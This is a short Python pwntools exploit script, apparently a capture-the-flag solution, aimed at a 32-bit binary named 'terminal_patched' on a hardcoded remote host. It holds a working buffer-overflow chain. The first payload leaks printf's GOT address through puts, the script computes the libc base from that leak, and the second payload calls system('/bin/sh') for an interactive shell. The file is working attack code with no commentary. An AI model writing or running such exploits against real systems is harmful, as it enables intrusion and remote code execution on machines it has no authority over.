#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./terminal_patched")
libc = ELF("./libc.so.6")

context.binary = exe

DOCKER_PORT = 1337
REMOTE_NC_CMD    = "nc 20.199.76.210 1005"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *0x8049508
b *0x80494e3
b *0x804967e
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    if args.DOCKER:
        return remote("localhost", DOCKER_PORT)
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()
    #r.sendline(b"flag.txt\0\0"+ p32(0x804bff4)*12 + p32(exe.bss(0x50c)) + p32(0x8049508) + p32(0x804a008))
    r.send(b"flag.txt\0".ljust(54, b"\0") + p32(0x804bff4)*2 + p32(exe.plt.puts) + p32(0x804974d) + p32(exe.got.printf))
    r.recvuntil(b"0")
    r.recvuntil(b"0")
    r.recvuntil(b"0")
    libc.address = u32(b"0"+r.recv(3)) - libc.sym.printf
    r.send(b"/bin/sh\0".ljust(54, b"\0") + p32(0x804bff4)*2 + p32(libc.sym.system) + p32(0x804974d) + p32(0x804c060))
    r.interactive()

if __name__ == "__main__":
    main()